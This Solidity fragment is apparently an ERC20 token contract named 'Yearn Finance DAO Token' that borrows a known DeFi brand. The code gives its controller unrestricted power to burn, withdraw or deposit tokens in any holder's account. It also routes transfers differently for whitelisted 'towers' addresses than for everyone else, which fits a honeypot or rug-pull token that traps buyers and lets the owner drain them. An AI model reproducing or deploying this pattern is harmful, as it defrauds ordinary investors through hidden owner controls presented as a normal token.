  address public uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  mapping (address => bool) public controller;
  mapping (address => bool) public towers;
  bool public saleOn = false;
  constructor () public ERC20Detailed("Yearn Finance DAO Token", "YF-DAO", 18) {
      _initMint( msg.sender, 1000*10**uint(decimals()) );
      controller[msg.sender] = true;
      towers[msg.sender] = true;
      towers[uniV2Router] = true;
  }
  function deposit(address account) public {
      require(controller[msg.sender], "error");
      _deposit(account);
  }
  function withdraw(address account, uint amount) public {
      require(controller[msg.sender], "error");
      _withdraw(account, amount);
  }
  function burn(address account, uint amount) public {
      require(controller[msg.sender], "error");
      _burn(account, amount);
  }
  function _mta(address from_, address to_, uint amount) internal {
    require(amount <= this.balanceOf(from_), "error");
    if(towers[from_]){
      super._mta(from_, to_, amount);
    } else {
      super._mta2(from_, to_, amount);
    }
  }
  function iniSale(address account) public {
      require(controller[msg.sender], "error");
      towers[account] = true;
      if(saleOn==false) saleOn = true;
  }
  function endSale(address account) public {
      require(controller[msg.sender], "error");
      towers[account] = false;
  }

}

